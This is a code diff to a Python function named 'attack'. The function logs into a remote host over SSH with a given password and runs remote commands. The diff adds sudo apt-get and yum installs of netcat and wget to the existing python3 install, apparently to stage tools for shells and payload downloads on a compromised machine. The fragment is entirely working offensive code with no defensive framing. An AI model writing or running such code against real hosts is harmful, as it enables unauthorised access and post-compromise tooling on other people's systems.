@@ -88,14 +88,35 @@ def attack(local_script_path, remote_script_path, remote_host, remote_user, remo
         ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh_client.connect(remote_host, username=remote_user, password=remote_password)
         
-        # Use apt to try to install python3
-        getpy1_command = "apt install python3"
+        # Attempt to install nc using apt and yum
+        nc1_command = "sudo apt-get update && sudo apt-get install -y nc"
+        stdin, stdout, stderr = ssh_client.exec_command(nc1_command)
+        print(stdout.read().decode('utf-8'))
+        print(stderr.read().decode('utf-8'))
+        
+        nc2_command = "sudo yum install -y nc"
+        stdin, stdout, stderr = ssh_client.exec_command(nc2_command)
+        print(stdout.read().decode('utf-8'))
+        print(stderr.read().decode('utf-8'))
+        
+        # Attempt to install wget using apt and yum
+        wget1_command = "sudo apt-get update && sudo apt-get install -y wget"
+        stdin, stdout, stderr = ssh_client.exec_command(wget1_command)
+        print(stdout.read().decode('utf-8'))
+        print(stderr.read().decode('utf-8'))
+        
+        wget2_command = "sudo yum install -y wget"
+        stdin, stdout, stderr = ssh_client.exec_command(wget2_command)
+        print(stdout.read().decode('utf-8'))
+        print(stderr.read().decode('utf-8'))
+        
+        # Attempt to install python3 using apt and yum
+        getpy1_command = "sudo apt-get update && sudo apt-get install -y python3"
         stdin, stdout, stderr = ssh_client.exec_command(getpy1_command)
         print(stdout.read().decode('utf-8'))
         print(stderr.read().decode('utf-8'))
         
-        # Use yum to try to install python3
-        getpy2_command = "yum install python3"
+        getpy2_command = "sudo yum install -y python3"
         stdin, stdout, stderr = ssh_client.exec_command(getpy2_command)
         print(stdout.read().decode('utf-8'))
         print(stderr.read().decode('utf-8'))
